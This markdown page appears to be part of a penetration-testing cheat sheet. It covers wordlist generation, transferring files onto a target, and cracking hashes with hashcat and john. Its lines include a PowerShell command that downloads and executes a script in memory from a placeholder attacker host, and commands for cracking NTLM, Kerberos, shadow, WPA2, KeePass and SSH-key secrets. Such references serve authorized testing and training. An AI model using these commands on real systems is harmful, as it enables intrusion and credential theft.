---
title: Misc
subtitle: MISC

sidebar:
  - label: SECTIONS
    items:
      - id: wordlists
        text: "Wordlists"
      - id: file-transfer
        text: "File Transfer"
      - id: hash-cracking
        text: "Hash Cracking"
---

## WORDLISTS
<!-- id: wordlists -->

### SecLists locations

#### bash | Common paths
```
/usr/share/seclists/Passwords/Leaked-Databases/rockyou.txt
/usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
/usr/share/seclists/Usernames/top-usernames-shortlist.txt
/usr/share/seclists/Fuzzing/LFI/LFI-Jhaddix.txt
/usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt
```

### Generate custom wordlist

#### cewl | Scrape words from target site
```
cewl http://<Target_IP> -d 3 -m 6 -w custom_words.txt
```

#### crunch | Pattern-based generation
```
crunch 8 12 abcdefghijklmnopqrstuvwxyz0123456789 -o wordlist.txt
```


## FILE TRANSFER
<!-- id: file-transfer -->

### HTTP server (serve files)

#### python3 | Simple HTTP server
```
python3 -m http.server 80
```

#### python3 | Upload server (receive files)
```
# Install: pip install uploadserver
python3 -m uploadserver 80
```

### Download on target

#### wget | Linux
```
wget http://<YOUR_IP>/<file> -O /tmp/<file>
```

#### curl | Linux
```
curl http://<YOUR_IP>/<file> -o /tmp/<file>
```

#### certutil | Windows
```
certutil -urlcache -split -f http://<YOUR_IP>/<file> C:\Windows\Temp\<file>
```

#### PowerShell | Windows download
```
Invoke-WebRequest -Uri http://<YOUR_IP>/<file> -OutFile C:\Windows\Temp\<file>
```

#### PowerShell | Download and exec in memory
```
IEX (New-Object Net.WebClient).DownloadString("http://<YOUR_IP>/script.ps1")
```

### SMB share (Windows file transfer)

#### impacket-smbserver | Host SMB share on attacker
```
impacket-smbserver share . -smb2support
```

#### cmd | Copy from share on target
```
copy \\<YOUR_IP>\share\<file> C:\Windows\Temp\<file>
```

## HASH CRACKING
<!-- id: hash-cracking -->

### Hash identification

#### hashid
```
hashid '<hash_string>'
```

### Hashcat — common modes

#### hashcat | Generic — swap mode and apply rules
```
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt
hashcat -m <mode> hashes.txt /usr/share/wordlists/rockyou.txt -r /usr/share/hashcat/rules/best64.rule
```

#### hashcat | MD5 — mode 0
```
hashcat -m 0 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### hashcat | SHA1 — mode 100
```
hashcat -m 100 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### hashcat | NTLM — mode 1000
```
hashcat -m 1000 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### hashcat | NTLMv2 — mode 5600
```
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### hashcat | sha512crypt Linux /etc/shadow — mode 1800
```
hashcat -m 1800 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### hashcat | bcrypt — mode 3200 (slow)
```
hashcat -m 3200 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### hashcat | Kerberos TGS / Kerberoast — mode 13100
```
hashcat -m 13100 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### hashcat | Kerberos AS-REP / ASREPRoast — mode 18200
```
hashcat -m 18200 hashes.txt /usr/share/wordlists/rockyou.txt
```

#### hashcat | WPA2 — mode 22000 (needs .hccapx capture)
```
hashcat -m 22000 capture.hccapx /usr/share/wordlists/rockyou.txt
```

### ZIP cracking

#### john
```
zip2john archive.zip > zip.hash
john zip.hash --wordlist=/usr/share/wordlists/rockyou.txt
john zip.hash --show
```

#### hashcat | Mode 13600 = WinZip AES / 17200 = PKZIP
```
hashcat -m 13600 zip.hash /usr/share/wordlists/rockyou.txt
# or for PKZIP (classic):
hashcat -m 17200 zip.hash /usr/share/wordlists/rockyou.txt
```

### KeePass (.kdbx) cracking

#### john
```
keepass2john database.kdbx > keepass.hash
john keepass.hash --wordlist=/usr/share/wordlists/rockyou.txt
john keepass.hash --show
```

#### hashcat | Mode 13400 = KeePass 1/2
```
hashcat -m 13400 keepass.hash /usr/share/wordlists/rockyou.txt
```

### PDF cracking

#### john
```
pdf2john file.pdf > pdf.hash
john pdf.hash --wordlist=/usr/share/wordlists/rockyou.txt
john pdf.hash --show
```

#### hashcat | Mode 10500 = PDF 1.3-1.4 / 10600 = PDF 1.7 L3 / 10700 = PDF 1.7 L8
```
hashcat -m 10500 pdf.hash /usr/share/wordlists/rockyou.txt
```

### SSH key cracking

#### john | Crack passphrase-protected private key
```
ssh2john id_rsa > id_rsa.hash
john id_rsa.hash --wordlist=/usr/share/wordlists/rockyou.txt
john id_rsa.hash --show
```
